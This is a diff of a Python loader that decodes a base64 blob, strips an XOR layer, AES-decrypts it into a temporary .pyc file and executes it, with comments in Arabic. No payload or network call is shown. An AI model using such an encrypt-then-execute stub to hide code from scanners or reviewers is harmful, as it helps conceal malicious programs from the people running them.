@@ -1,21 +1,26 @@
-import base64
-import tempfile
-import runpy
-import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
+import base64
 
-def decrypt_and_run(data_b64, key_b64, iv_b64):
-    data = base64.b64decode(data_b64)
-    key = base64.b64decode(key_b64)
-    iv = base64.b64decode(iv_b64)
+def xor_decrypt(data: bytes, key: bytes) -> bytes:
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
 
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    decrypted = unpad(cipher.decrypt(data), AES.block_size)
+def decrypt_and_run(data_b64, aes_key, aes_iv, xor_key):
+    try:
+        encrypted = base64.b64decode(data_b64)
+        decrypted_once = xor_decrypt(encrypted, xor_key)
+        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
+        pyc_data = unpad(cipher.decrypt(decrypted_once), AES.block_size)
 
-    with tempfile.NamedTemporaryFile(delete=False, suffix=".pyc") as f:
-        f.write(decrypted)
-        path = f.name
+        # حفظ وتشغيل ملف pyc مؤقت
+        import tempfile, importlib.util, os
+        with tempfile.NamedTemporaryFile(delete=False, suffix=".pyc") as f:
+            f.write(pyc_data)
+            temp_pyc = f.name
 
-    runpy.run_path(path)
-    os.unlink(path)
+        spec = importlib.util.spec_from_file_location("decrypted_module", temp_pyc)
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+        os.unlink(temp_pyc)
+    except Exception as e:
+        print("فشل فك التشفير:", e)
